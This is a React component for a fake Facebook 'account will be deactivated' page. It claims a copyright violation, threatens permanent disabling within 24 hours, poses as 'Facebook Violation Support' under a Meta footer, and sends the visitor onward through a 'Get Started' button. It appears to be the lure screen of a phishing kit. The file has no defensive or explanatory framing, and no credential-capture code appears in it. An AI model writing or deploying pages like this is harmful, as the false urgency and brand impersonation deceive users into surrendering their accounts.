import { useState } from 'react';
import { Button } from '@/components/ui/button';

interface LandingPageProps {
  onGetStarted: () => void;
}

export default function LandingPage({ onGetStarted }: LandingPageProps) {
  const [isButtonPressed, setIsButtonPressed] = useState(false);

  // JavaScript button handler
  const handleGetStartedClick = () => {
    setIsButtonPressed(true);
    
    // Add visual feedback for button press
    setTimeout(() => {
      setIsButtonPressed(false);
      onGetStarted();
    }, 150);
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-3 sm:p-4">
      <div className="max-w-sm sm:max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
        {/* Facebook Logo */}
        <div className="text-center py-4 sm:py-6 px-4 sm:px-6">
          <div className="w-12 h-12 sm:w-16 sm:h-16 bg-facebook-blue rounded-full flex items-center justify-center mx-auto mb-3 sm:mb-4">
            <span className="text-white font-bold text-lg sm:text-2xl">f</span>
          </div>
        </div>

        {/* Main Content */}
        <div className="px-4 sm:px-6 pb-4 sm:pb-6">
          <div className="text-center mb-4 sm:mb-6">
            <h3 className="text-lg sm:text-xl font-semibold text-facebook-text mb-3 sm:mb-4">
              Account will be deactivated
            </h3>
            
            <div className="space-y-3 sm:space-y-4 text-xs sm:text-sm text-facebook-text">
              <p className="leading-relaxed">
                Your account or the page you use has violated copyright. We will 
                immediately limit your account or permanently disable it for 
                non-compliance with our terms of service.
              </p>
              
              <p className="leading-relaxed">
                If you think we've accidentally suspended your account, you have 24 hours 
                to verify your account. If you miss this security notification, your 
                account will be permanently disabled.
              </p>
            </div>
          </div>

          {/* Support Section */}
          <div className="bg-gray-50 rounded-lg p-3 sm:p-4 mb-4 sm:mb-6">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 sm:w-12 sm:h-12 bg-facebook-blue rounded-full flex items-center justify-center flex-shrink-0">
                <span className="text-white font-bold text-sm sm:text-lg">f</span>
              </div>
              <div>
                <div className="font-semibold text-facebook-blue text-xs sm:text-sm">
                  Facebook Violation Support
                </div>
              </div>
            </div>
          </div>

          <div className="text-center mb-4 sm:mb-6">
            <p className="text-xs sm:text-sm text-facebook-secondary leading-relaxed">
              We will walk you through several steps to cancel a deactivated account.
            </p>
          </div>

          {/* Get Started Button with JavaScript interaction */}
          <Button
            onClick={handleGetStartedClick}
            disabled={isButtonPressed}
            className={`w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-2 sm:py-3 px-4 rounded-md text-sm sm:text-base font-medium transition-all duration-150 ${
              isButtonPressed ? 'scale-95 opacity-80' : 'scale-100 opacity-100'
            }`}
          >
            {isButtonPressed ? 'Loading...' : 'Get Started'}
          </Button>
        </div>

        {/* Footer */}
        <div className="text-center py-3 sm:py-4 text-xs text-facebook-secondary border-t border-facebook-border">
          Meta © 2025
        </div>
      </div>
    </div>
  );
}